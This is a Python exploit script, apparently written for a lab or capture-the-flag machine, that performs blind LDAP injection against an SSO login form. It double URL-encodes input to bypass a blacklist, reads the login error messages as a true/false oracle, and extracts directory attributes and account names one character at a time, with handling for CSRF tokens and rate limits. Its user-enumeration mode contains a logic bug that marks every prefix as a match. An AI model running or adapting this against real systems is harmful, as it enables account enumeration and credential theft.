#!/usr/bin/env python3
"""
Hercules SSO blind LDAP injection oracle.

The /Login username field is placed into an LDAP filter. The client-side and
server-side regex blacklist can be bypassed with DOUBLE URL encoding because
the application decodes twice before validating, so metacharacters survive
into the query.

Responses:
  "Login attempt failed"  -> at least one entry matched the filter  (TRUE)
  "Invalid login attempt" -> zero entries matched                   (FALSE)
  bare re-rendered form   -> LDAP syntax error (bad injection)

Usage:
  python3 ldap_oracle.py test '*)(description=*'        # single condition
  python3 ldap_oracle.py attrs                          # which attrs are populated
  python3 ldap_oracle.py extract 'DESCRIPTION_EXPR'
  python3 ldap_oracle.py users                          # enumerate sAMAccountName
"""
import re
import sys
import time
import urllib.parse

import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://10.129.242.196"
LOGIN = f"{BASE}/Login"
S = requests.Session()
S.verify = False

TRUE_MSG = "Login attempt failed"     # >=1 match
FALSE_MSG = "Invalid login attempt"   # 0 matches

_next_call = [0.0]
MIN_GAP = 1.6          # seconds between requests (~20 req / 30 s window)


def dbl(s: str) -> str:
    """Double URL-encode: app decodes twice, so metachars reach LDAP."""
    return urllib.parse.quote(urllib.parse.quote(s, safe=""), safe="")


def _token() -> str:
    r = S.get(LOGIN, timeout=15)
    m = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', r.text)
    if not m:
        raise RuntimeError("no anti-forgery token")
    return m.group(1)


def _post(username_raw: str, password: str = "x", retries: int = 6) -> str:
    """POST with an already-encoded username. Returns the raw body."""
    for attempt in range(retries):
        gap = _next_call[0] - time.time()
        if gap > 0:
            time.sleep(gap)
        _next_call[0] = time.time() + MIN_GAP
        body = (f"Username={username_raw}&Password={password}"
                f"&RememberMe=false&__RequestVerificationToken={_token()}")
        r = S.post(LOGIN, data=body.encode(),
                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                   timeout=20)
        if r.status_code == 429:
            wait = 32
            m = re.search(r"Too Many Requests\s*(\d+)", r.text)
            if m:
                wait = max(int(m.group(1)), 20) + 3
            print(f"    [429] backing off {wait}s", flush=True)
            time.sleep(wait)
            _next_call[0] = time.time() + MIN_GAP
            continue
        return r.text
    raise RuntimeError("persistent 429")


def oracle(injection: str, password: str = "x") -> bool:
    """True if the injected LDAP condition matches >=1 entry."""
    html = _post(dbl(injection), password)
    if TRUE_MSG in html:
        return True
    if FALSE_MSG in html:
        return False
    return False  # syntax error -> treat as no match


def probe(injection: str) -> str:
    html = _post(dbl(injection))
    if TRUE_MSG in html:
        return "MATCH (>=1)"
    if FALSE_MSG in html:
        return "no-match"
    return f"ldap-error/other (len={len(html)})"


CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-.!@#$%^&*()+={}[]:;,.?/|~ "


def extract(attr_expr: str, known: str = "", max_len: int = 60, quiet: bool = False):
    """Character-by-character prefix extraction for an expression such as
    '*)(description=VALUE' — we append guessed characters before the '*'.

    attr_expr must contain the literal placeholder '@' where the value goes,
    e.g. '*)(sAMAccountName=auditor)(description=@*'
    """
    assert "@" in attr_expr, "expression needs a @ placeholder"
    value = known
    while len(value) < max_len:
        found = None
        for c in CHARSET:
            if c in "*()":
                continue  # can't be represented literally without hex escapes
            cand = value + c
            inj = attr_expr.replace("@", cand)
            if oracle(inj):
                found = c
                break
        if found is None:
            break
        value += found
        if not quiet:
            print(f"    -> {value!r}", flush=True)
    return value


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "test"
    if mode == "test":
        print(probe(sys.argv[2]))
    elif mode == "attrs":
        attrs = ["description", "info", "userPassword", "comment", "title",
                 "department", "mail", "telephoneNumber", "wWWHomePage", "url",
                 "ipPhone", "notes", "company", "streetAddress", "postOfficeBox",
                 "displayName", "givenName", "sn", "userPrincipalName", "logonCount"]
        for a in attrs:
            res = probe(f"*)({a}=*")
            print(f"{a:22s} {res}", flush=True)
    elif mode == "extract":
        print("value =", extract(sys.argv[2]))
    elif mode == "users":
        # enumerate sAMAccountName characters by prefix expansion
        found = set()
        frontier = [""]
        letters = "abcdefghijklmnopqrstuvwxyz"
        for prefix in list(frontier):
            for c in letters + "0123456789._-":
                p = prefix + c
                if probe(f"{p}*"):
                    found.add(p)
                    print(f"prefix: {p}", flush=True)
